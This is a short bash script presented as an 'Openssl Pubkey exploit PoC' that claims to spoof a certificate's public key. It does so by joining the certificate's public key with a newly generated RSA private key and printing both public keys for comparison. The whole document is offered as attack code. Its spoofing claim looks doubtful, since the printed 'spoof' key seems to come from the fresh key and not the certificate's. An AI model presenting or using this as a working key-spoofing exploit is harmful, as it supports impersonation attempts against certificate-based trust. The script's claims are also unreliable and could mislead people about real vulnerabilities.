#!/bin/bash
echo "Openssl Pubkey exploit PoC"
echo "usage: keyspoof cert.crt spoof.key"   # change to "keyspoof-v1.sh"
openssl x509 -in $1 -pubkey -noout > $2
openssl genrsa 2048 >> $2
openssl rsa -in $2 -out $2
echo "Cert Public Key: "
openssl x509 -in $1 -pubkey -noout
echo "PoC Spoof: "
openssl rsa -in $2  -pubout
